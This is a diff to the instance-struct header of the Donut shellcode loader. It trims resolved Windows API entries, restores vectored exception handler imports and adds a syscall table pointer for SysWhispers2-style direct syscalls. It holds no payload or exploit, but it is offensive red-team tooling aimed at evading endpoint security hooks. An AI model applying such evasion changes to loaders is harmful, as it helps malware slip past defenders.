@@ -253,8 +253,8 @@ typedef struct _DONUT_INSTANCE {
     uint64_t    iv;                           // the 64-bit initial value for maru hash
 
     union {
-      uint64_t  hash[64];                     // holds up to 64 api hashes
-      void     *addr[64];                     // holds up to 64 api addresses
+      uint64_t  hash[58];                     // holds up to 58 api hashes (reduced from 64 for syscall support)
+      void     *addr[58];                     // holds up to 58 api addresses
       // include prototypes only if header included from loader.h
       #ifdef LOADER_H
       struct {
@@ -264,12 +264,9 @@ typedef struct _DONUT_INSTANCE {
         GetModuleHandleA_t               GetModuleHandleA;  
         VirtualAlloc_t                   VirtualAlloc;     
         VirtualFree_t                    VirtualFree;  
-        VirtualQuery_t                   VirtualQuery;
-        VirtualProtect_t                 VirtualProtect;
         Sleep_t                          Sleep;
         MultiByteToWideChar_t            MultiByteToWideChar;
         GetUserDefaultLCID_t             GetUserDefaultLCID;
-        WaitForSingleObject_t            WaitForSingleObject;
         CreateThread_t                   CreateThread;
         CreateFileA_t                    CreateFileA;
         GetFileSizeEx_t                  GetFileSizeEx;
@@ -283,7 +280,6 @@ typedef struct _DONUT_INSTANCE {
         GetProcessHeap_t                 GetProcessHeap;
         HeapFree_t                       HeapFree;
         GetLastError_t                   GetLastError;
-        CloseHandle_t                    CloseHandle;
         
         // imports from shell32.dll
         CommandLineToArgvW_t             CommandLineToArgvW;
@@ -331,16 +327,14 @@ typedef struct _DONUT_INSTANCE {
         RtlGetCompressionWorkSpaceSize_t RtlGetCompressionWorkSpaceSize;
         RtlDecompressBuffer_t            RtlDecompressBuffer;
         NtContinue_t                     NtContinue;
-        NtCreateSection_t                NtCreateSection;
-        NtMapViewOfSection_t             NtMapViewOfSection;
-        NtUnmapViewOfSection_t           NtUnmapViewOfSection;
-       // AddVectoredExceptionHandler_t    AddVectoredExceptionHandler;
-       // RemoveVectoredExceptionHandler_t RemoveVectoredExceptionHandler;
-       // RtlFreeUnicodeString_t         RtlFreeUnicodeString;
-       // RtlFreeString_t                RtlFreeString;
+        AddVectoredExceptionHandler_t    AddVectoredExceptionHandler;
+        RemoveVectoredExceptionHandler_t RemoveVectoredExceptionHandler;
       };
       #endif
     } api;
+    
+    // pointer to syscall table for syswhispers2
+    uint64_t    syscall_list;
     
     int         exit_opt;                     // 1 to call RtlExitUserProcess and terminate the host process, 2 to never exit or cleanup and block
     int         entropy;                      // indicates entropy level
